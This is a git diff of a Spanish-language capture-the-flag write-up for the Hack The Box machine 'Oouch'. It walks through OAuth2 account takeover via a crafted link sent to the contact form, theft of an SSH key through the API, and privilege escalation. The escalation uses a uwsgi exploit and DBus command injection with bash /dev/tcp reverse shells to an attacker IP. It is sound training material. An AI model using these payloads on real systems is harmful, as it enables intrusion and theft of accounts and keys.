@@ -1,5 +1,6 @@
 # 10.10.10.177 - Oouch
 -----------------------
+# Part 1: Reconocimiento inicial:
 
 Puertos abiertos 21(ftp) 22(ssh), 5000(http, nginx), 8000(rstp?)
 
@@ -12,22 +13,18 @@ ftp> dir
 ftp> prompt of
 ftp> mget *
 ```
-
 Si abrimos el project.txt dice que:
 ```console
 Flask -> Consumer
 Django -> Authorization Server
 ```
-
-Al intentar acceder al servidor montado en el puerto 8000 me da un error 400 bad request (incluso intentando por
-POST)
+Al intentar acceder al servidor montado en el puerto 8000 me da un error 400 bad request (incluso intentando por POST)
 
 ---------------------------
-## Web del puerto 5000 (nginx)
 
-Al entrar nos topamos con un panel de login, con la opción de registro, lo primero que nos llama la atención es
-la url ```http://10.10.10.177:5000/login?next=%2F```
+# Part 2: Web del puerto 5000 (nginx)
 
+Al entrar nos topamos con un panel de login, con la opción de registro, lo primero que nos llama la atención es la url ```http://10.10.10.177:5000/login?next=%2F```
 ```console
 └─$ php --interactive
 php > echo(urldecode("%2f")); # /
@@ -36,19 +33,17 @@ Intentamos varias cosas como ```next=/../../../../, next=https://google.com next
 Si le damos al boton home sale -> ```login?next=%2Fhome``` pero seguimos en login.
 
 Si nos registramos cucuxii:cucuxii@cucuxii.htb nos dan mas opciones.
-
 Inspeccionando el codigo fuente para buscar cosas ocultas nos encontramos con un csrf_token y poca cosa más.
 ```<input id="csrf_token" name="csrf_token" type="hidden" value="IjExZWQ2YjFlN2FlNDhjYzg5MjI1...">```
 
 Nuestro usuario arrastra una cookie de sesion pero que al decodificarla en jwt.io da bytes sin sentido.
-
-Si investigamos la web:
-- /profile # Nos habla que no tenemos cuentas conectadas
-- /password change # para cambiar la contraseña
-- /documents # solo disponible para usaurios administradores
-- /about # Habla de un authorization server y un sistema de autorización a traves de varias aplicaciones.
-- /contact # /POST a /contact con los datos {'textfield':'test', 'submit':'send'} y el csrf token.
-- /password_change # POST con los datos 'opassword' (antigua contr.) 'npassword'(nueva) y 'cpassword'(nueva)
+Si investigamos la web:  
+- /profile # Nos habla que no tenemos cuentas conectadas  
+- /password change # para cambiar la contraseña  
+- /documents # solo disponible para usaurios administradores  
+- /about # Habla de un authorization server y un sistema de autorización a traves de varias aplicaciones.  
+- /contact # /POST a /contact con los datos {'textfield':'test', 'submit':'send'} y el csrf token.  
+- /password_change # POST con los datos 'opassword' (antigua contr.) 'npassword'(nueva) y 'cpassword'(nueva)  
 
 Como hay una seccion de contacto y una de cambiar la contraseña, podemos intentar cambiarsela a un posible admin.
 Si tramitamos la peticion de cambiar contraseña por bupsuite:
@@ -100,17 +95,9 @@ y tras de él, se envian esos datos sensibles.
 
 <-------- Diagrama ----------->
 
------------------------------
+----------------------------- 
 
-# 
-
-Si le damos al enlace de /connect
-```
-GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read 
-
-http://authorization.oouch.htb:8000/login/
-```
-
+Si le damos al enlace de /connect nos lleva a ```http://authorization.oouch.htb:8000/login/``` (añadir el nombre al /etc/hosts)
 En authorization.oouch.htb/login al poner nuestras creds del otro lado no funcionan.
 Esto es otro subdominio, asi que si quitamos lo de /login y se queda en authorization.oouch.htb:8000/
 ```
@@ -119,11 +106,9 @@ aplicaciones
 	Login : /login
 	Registro: /signup
 ```
-Una vez nos registramos con cucuxii:contraseña123.
-Ahi nos dan dos urls 
+Una vez nos registramos con cucuxii:contraseña123. Nos dan dos urls 
  - oauth/authorize
  - oauth/token
-
 Pero estan disfuncionales los dos. Si buscamos mas
 ```console
 └─$ wfuzz -t 200 --hc=404,400,502 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://authorization.oouch.htb:8000/oauth/FUZZ
@@ -134,25 +119,29 @@ Pero estan disfuncionales los dos. Si buscamos mas
 
 -------------------------------
 
-Si le damos otra vez a http://consumer.oouch.htb:5000/oauth/connect desde consumer.oouch.htb nos sale un panel
-de autorizacíon:
+# Part 3: Pentesting Oauth2 -> robo de cuenta
+
+Si le damos otra vez a ```http://consumer.oouch.htb:5000/oauth/connect``` desde consumer.oouch.htb nos sale un panel de autorizacíon:
 Con burpsuite
 ```
+[Peticion 1 -> Darle a Fordward]
 POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&response_type=code&redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&scope=read
-
-csrfmiddlewaretoken=Ma6WomfLbKMIrqt05Xo9IkeHmhCWqrBAiBE4nfC8fxkqNMpkvYWhaRyD79h2sgiA&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
+DATA :csrfmiddlewaretoken=Ma6WomfLbKMIrqt05Xo9IkeHmhCWqrBAiBE4nfC8fxkqNMpkvYWhaRyD79h2sgiA&redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&scope=read&client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&state=&response_type=code&allow=Authorize
 [Forward]
 
+[Peticion 1 -> NO Darle a Fordward!]
 GET /oauth/connect/token?code=0HEcoYFa5Kde7MDN6aERyfcQgJTdWM HTTP/1.1
-[No darle a Forward]
 ```
 Si copiamos el enlace de GET sin darle a forward y lo metemos en la parte de contacto
 ```http://consumer.oouch.htb:5000/oauth/connect/token?code=0HEcoYFa5Kde7MDN6aERyfcQgJTdWM```
 
-Te deslogueas y te logueas otra vez pero con el /oauth/login en vez del /login (O sea por oauth)
+Te deslogueas y te logueas otra vez pero con el /oauth/login en vez del /login (O sea por oauth) te sale otro panel de autorizacion, esta vez darle a authorize
 Por tanto entras con la cuenta "qtc:qtc@nonexistend.nonono"
 
 ---------------------------------
+
+# Part 4: Pentesting Oauth2 -> autorizacion de aplicaciones
+
 Esta persona en /Documents tiene
 ```
 dev_access.txt -> develop:supermegasecureklarabubu123! -> Permite registrar una aplicación
@@ -160,21 +149,23 @@ o_auth_notes.txt -> /api/get_user -> user data. oauth/authorize -> Now also supp
 todo.txt -> Crhis menciono que todos los usuarois pueden obtener mi llave ssh... debe ser una broma. 
 ```
 
-En /applications no nos deja con las creds estas.
-Pero si vamos a /applicat2ions/register si que funcionan.
+En /applications no nos deja con las creds estas (develop:supermegasecureklarabubu123!)
+Pero si vamos a /applications/register si que funcionan.
 
+```
+[DATOS DE NUESTRA APLICACION]
 id: Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA
 secret: cwsC3srw1taHAvg0xnOMYHsSPyn8gas7ZrapAlMffMEIY1vygjkfAkPNarxwgE792gmt4temsYp1UF2u5AyEIinjMyR6zL8Di408gQyrS1tlO8B88ZGwlvw59O4Ltzwk
 redirect_uri: http://10.10.14.16/test
 url: http://authorization.oouch.htb:8000/oauth/applications/2/
-
-Nos vamos otra vez a /oauth/connect e interceptamos al darle a authorize. Ponemos los datos de redirect_uri y
-client id que hemos sacado de la aplicacion
-Camibamos de POST a GET quedanose como
+```
+Nos vamos otra vez a ```http://consumer.oouch.htb:5000/oauth/connect``` e interceptamos al darle a authorize. Ponemos los datos de redirect_uri y client id que
+hemos sacado de nuestra aplicacion
+Camibamos de POST a GET y quitando ciertos parametros como el *csrfmiddlewaretoken* 
 ```
 GET /oauth/authorize/?client_id=Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA&response_type=code&redirect_uri=http://10.10.14.16/test&scope=read&state=&allow=Authorize
 ```
-Ahora le mandamos por /contact
+Le damos a copy URL y ahora le mandamos por /contact
 ```http://authorization.oouch.htb:8000/oauth/authorize/?client_id=Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA&response_type=code&redirect_uri=http://10.10.14.16/test&scope=read&state=&allow=Authorize```
 
 ```console
@@ -182,18 +173,24 @@ Ahora le mandamos por /contact
 Ncat: Connection from 10.10.10.177:33156.
 GET /test?code=fe7kjqU3BT9WIYeQ8DNQns5DTXxLR6 HTTP/1.1
 Cookie: sessionid=cit35r8dujmo87ihnjaa9l250zt2t6yu;
-
+```
+Esto nos permite pedir un token de acceso a la api ya que tenemos la cookie del qtc y el codigo:
+```
 └─$ curl http://authorization.oouch.htb:8000/oauth/token/ -d 'client_id=Cn55qW8DMDIvhWLkJLECtX0iJtNILk3WJgwiGmrA&client_secret=cwsC3srw1taHAvg0xnOMYHsSPyn8gas7ZrapAlMffMEIY1vygjkfAkPNarxwgE792gmt4temsYp1UF2u5AyEIinjMyR6zL8Di408gQyrS1tlO8B88ZGwlvw59O4Ltzwk&redirect_uri=http://10.10.14.16/test&code=fe7kjqU3BT9WIYeQ8DNQns5DTXxLR6&grant_type=authorization_code'
 {"access_token": "7hOVKU8cCfq54uX3YhqMWBevyrD8Eg", "expires_in": 600, "token_type": "Bearer", "scope": "read", "refresh_token": "T6jt9EMTaFyeUoeSHHACdul2zG074X"} 
 
 └─$ curl -s http://authorization.oouch.htb:8000/api/get_user -H "Authorization: Bearer 7hOVKU8cCfq54uX3YhqMWBevyrD8Eg"
 {"username": "qtc", "firstname": "", "lastname": "", "email": "qtc@nonexistend.nonono"}
+
+└─$ curl -s http://authorization.oouch.htb:8000/api/get_ssh -H "Authorization: Bearer 7hOVKU8cCfq54uX3YhqMWBevyrD8Eg"
+# La lalve privada de QTC
 ```
 
-
-
+Le cambiamos los privilegios a ```chmos 660 id_rsa``` y podemos hacer ssh como qtc usando dicha lllave ```ssh -i id_rsa qtc@10.10.10.177```
 
 ------------------------------------------
+# Part 5: Pivoting en el sistema
+
 En nuestro /home hay una .note.txt (archivo oculto) que dice así:
 ```Implementando un IPS usando DBus e iptables == Genio?```
 Si habla de iptables se referirá a lo de bloquear el intento de hackeo de la sección contact
@@ -234,18 +231,21 @@ Escaneando host: 172.18.0.3 # Puerto 3306 (sql)
 Escaneando host: 172.18.0.4 # Puerto 22, 5000
 Escaneando host: 172.18.0.5 # Puerto 8000
 ```
-El tema de las iptables está en la 4
+El tema de las iptables está en la 4 ya que es el nginx con la ruta del connect
+
+------------------------------------------
+# Part 6: Escalando privilegios
+
 ```console
 qtc@oouch:~$ ssh qtc@172.18.0.4
 qtc@b14c1692af51:/code/oouch$ grep -rIe "hacker" 2>/dev/null # Encuentro la ruta code/oouch
 ```
-
+En esa ruta hay un archivo llamado routes.py que se encarga de todo el servidor nginx. A nosotros nos interesa la parte de /contact
 ```
 sys.path.insert(0, "/usr/lib/python3/dist-packages")
 import dbus
 regex = re.compile("((?:http(s)?:\/\/)?[\w.-]+(?:\.[\w\.-]+)+[\w\-\._~:/?#[\]@!\$&'\(\)\*\+,;=
-primitive_xss = re.compile("(<script|<img|<svg|onload|onclick|onhover|onerror|<iframe|<html|al
-")
+primitive_xss = re.compile("(<script|<img|<svg|onload|onclick|onhover|onerror|<iframe|<html|al")
 
 @app.route('/contact', methods=['GET', 'POST'])
 @login_required
@@ -261,6 +261,8 @@ def contact():
             bus.close()
             return render_template('hacker.html', title='Hacker')
 ```
+Si lo intentamos replicar...
+
 ```console 
 qtc@b14c1692af51:/code/oouch$ python
 >>> import sys
@@ -270,30 +272,26 @@ qtc@b14c1692af51:/code/oouch$ python
 >>> block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
 >>> block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
 >>> client_ip = '; ping -c 1 10.10.14.16; #'
->>> response = block_iface.Block(client_ip) # error bajos privilegios
->>> exit()
-
+>>> response = block_iface.Block(client_ip) # Error
+```
+Da un error por tema de privilegios, somos qtc y tenemos que ser www-data que es quien corre las web
+```
 qtc@b14c1692af51:/code/oouch$ cat /etc/nginx/nginx.conf
 user www-data;
         location / {
             include uwsgi_params;
-            uwsgi_pass unix:/tmp/uwsgi.socket;
-        }
-...
-
-[wsgi exploit](https://raw.githubusercontent.com/wofeiwo/webcgi-exploits/master/python/uwsgi_exp.py)
+            uwsgi_pass unix:/tmp/uwsgi.socket;}
+```
+Como nos habla de uwsgi, buscamos ```uwsgi exploit``` y acabamos con: [exploit](https://raw.githubusercontent.com/wofeiwo/webcgi-exploits/master/python/uwsgi_exp.py)
 ```console
-qtc@b14c1692af51:/tmp$ cat << EOF >> exploit.py
+qtc@b14c1692af51:/tmp$ cat << EOF >> exploit.py   # Para copiarlo ya que los contenedores no disponen de nano o vim
 > #!/usr/bin/python
 ...
-> if __name__ == '__main__':
 >     main()
 > EOF
 
-qtc@b14c1692af51:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "whoami"
-# ModuleNotFoundError: No module named 'bytes'
-
-qtc@b14c1692af51:/tmp$ sed -i "/import bytes/d" exploit.py
+qtc@b14c1692af51:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "whoami" # ModuleNotFoundError: No module named 'bytes'
+qtc@b14c1692af51:/tmp$ sed -i "/import bytes/d" exploit.py # eliminar la linea problematica
 qtc@b14c1692af51:/tmp$ python exploit.py -m unix -u /tmp/uwsgi.socket -c "bash -c 'bash -i >& /dev/tcp/10.10.14.16/6666 0>&1'"
 ```
 Con netcat obtenemos la shell en el puerto 6666 ```sudo nc -nlvp 6666```
@@ -309,6 +307,12 @@ Al hacer otra vez
 
 >>> client_ip = '; bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1" #'
 >>> response = block_iface.Block(client_ip)
-# Shell como root en la máquina -> sudo nc -nlvp 443
 ```
+Obtenemos la shell como root en la máquina -> ```sudo nc -nlvp 443```
 
+-----------------------
+
+# Disclaimer 
+He podido hacer está maquina en mi proceso de aprendizaje gracias a:
+[s4vitar](https://www.youtube.com/watch?v=uIIZG2miowo)
+[0xdf](https://0xdf.gitlab.io/2020/08/01/htb-oouch.html)
